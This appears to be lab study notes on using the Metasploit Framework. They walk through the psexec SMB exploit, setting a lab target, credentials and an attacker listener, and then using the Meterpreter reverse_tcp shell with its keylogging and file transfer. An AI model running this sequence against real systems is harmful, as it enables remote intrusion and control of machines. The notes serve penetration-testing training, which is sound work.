## 1. What is Metasploit?

**Metasploit Framework (MSF)** is an automated exploitation framework developed by Rapid7. It streamlines finding exploits, configuring them, and delivering payloads (like reverse shells) to vulnerable targets.

* **Key components:**
* **Exploits:** The code that takes advantage of a vulnerability.
* **Payloads:** The code delivered by the exploit (e.g., establishing a shell, running a command).
* **Auxiliary:** Modules for scanning, fuzzing, and enumeration.



## 2. Basic MSF Workflow (Example: `psexec`)

The typical workflow involves searching for a vulnerability, selecting a module, configuring its options, and executing it.

### Step 1: Launch Metasploit

* **Command:** `sudo msfconsole`

### Step 2: Search for an Exploit

After enumerating a target (e.g., finding SMB port 445 open via Nmap), search for relevant modules.

* **Command:** `search smb`
* *Understanding the output:*
`exploit/windows/smb/psexec`
* `exploit/`: The module type.
* `windows/`: The target platform.
* `smb/`: The service being targeted.
* `psexec`: The specific tool/technique used.



### Step 3: Select the Module

* **Command:** `use <number>` (e.g., `use 56`) OR `use exploit/windows/smb/psexec`

### Step 4: Configure the Exploit & Payload

Check what parameters the module requires using the `options` command.

* **View required settings:**
```bash
options

```


* **Set the necessary parameters:**
| Variable | Description | Example Command |
| --- | --- | --- |
| **RHOSTS** | Target/Victim IP Address | `set RHOSTS 10.129.180.71` |
| **SHARE** | Target SMB Share | `set SHARE ADMIN$` |
| **SMBUser** | Username for authentication | `set SMBUser htb-student` |
| **SMBPass** | Password for authentication | `set SMBPass HTB_@cademy_stdnt!` |
| **LHOST** | Local/Attacker IP Address (Your VPN IP) | `set LHOST 10.10.14.222` |
| **LPORT** | Local/Attacker Listening Port | `set LPORT 4444` |



### Step 5: Execute the Attack

* **Command:** `exploit` (or `run`)

## 3. Post-Exploitation: The Meterpreter Shell

By default, many Windows exploits in MSF deliver the `windows/meterpreter/reverse_tcp` payload.

* **What is Meterpreter?** An advanced, stealthy payload that resides entirely in memory (DLL injection) rather than touching the disk.
* **Capabilities:** Allows file uploads/downloads, keylogging, process management, and more.
* **Useful Commands:**
* `?` or `help`: Lists all available Meterpreter commands.
* `shell`: Drops you from the Meterpreter prompt (`meterpreter >`) into a native OS system shell (`C:\WINDOWS\system32>`).
